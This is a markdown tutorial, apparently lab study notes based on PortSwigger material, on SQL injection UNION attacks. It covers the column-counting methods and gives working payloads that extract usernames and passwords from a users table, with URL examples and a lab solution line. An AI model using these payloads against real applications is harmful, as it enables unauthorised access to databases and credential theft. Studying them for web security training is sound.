# SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

## Table of Content

- [theory](#theory)
- [Determining the number of columns required](#determining-the-number-of-columns-required)
    - [First method](#first-method)
    - [Seconde method](#seconde-method)
- [Database specific syntax](#database-specific-syntax)
- [Using a SQL injection UNION attack to retrieve interesting data](#using-a-sql-injection-union-attack-to-retrieve-interesting-data)
- [Retrieving multiple values within a single column](#retrieving-multiple-values-within-a-single-column)

## Theory:

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

How many columns are being returned from the original query ?

Which columns returned from the original query are of a suitable data type to hold the results from the injected query ?

## Determining the number of columns required

2 options exist to determine it:

#### First method:

One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- etc.
```

URL example:

`https://test.net?category=Accessories' ORDER BY 1--` -> increment `1` with [burp brutforce](/tools/burpsuite/brutforce.md) till the webpage return an error

response can be:

- error http
- generic error response
- no result 

#### Seconde method

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. 

URL example:

`https://test.net?category=Accessories' UNION SELECT NULL,NULL --`... till it doesnt return an error

### Database specific syntax

On Oracle, every SELECT query must use the FROM keyword and specify a valid table.

`' UNION SELECT NULL FROM DUAL--`

## Using a SQL injection UNION attack to retrieve interesting data

Require: 

- [Determining the number of columns](#determining-the-number-of-columns-required)
- [Finding columns with a useful data type](#finding-columns-with-a-useful-data-type)

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the WHERE clause.
- The database contains a table called users with the columns username and password.

In this example, you can retrieve the contents of the users table by submitting the input:

`' UNION SELECT username, password FROM users--`

In order to perform this attack, you need to know that there is a table called users with two columns called username and password. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

solve:

`?Accessories' UNION SELECT username, password FROM users --`

## Retrieving multiple values within a single column

if there is a single column you can't concat values before sending to the single column: 

to see all syntax for [string concate](/)

String concatenation

SQL | format
--- | ---
Oracle | `'foo'||'bar'`
Microsoft | `'foo'+'bar'`
PostgreSQL | `'foo'||'bar'`
MySQL | `'foo' 'bar'` OR `CONCAT('foo','bar')`

For example, on Oracle you could submit the input:
`' UNION SELECT username || '~' || password FROM users--`

Example :

union as 2 column : unknow type | string

`?Accessories' UNION SELECT NULL, username||'~'||password FROM users--`

### Documentation

- [portswigger](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks)
